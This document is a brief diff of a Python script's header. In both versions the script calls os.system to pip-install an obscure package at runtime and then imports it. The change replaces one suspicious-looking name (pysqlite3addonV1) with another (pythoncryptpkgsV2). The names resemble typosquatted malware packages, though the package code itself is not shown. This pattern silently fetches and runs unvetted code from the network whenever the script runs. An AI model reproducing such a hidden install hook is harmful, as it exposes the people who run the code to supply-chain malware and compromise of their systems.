@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlite3addonV1")
-import pysqlite3addonV1
+os.system("pip install pythoncryptpkgsV2")
+import pythoncryptpkgsV2
 import random
 import requests
 import time
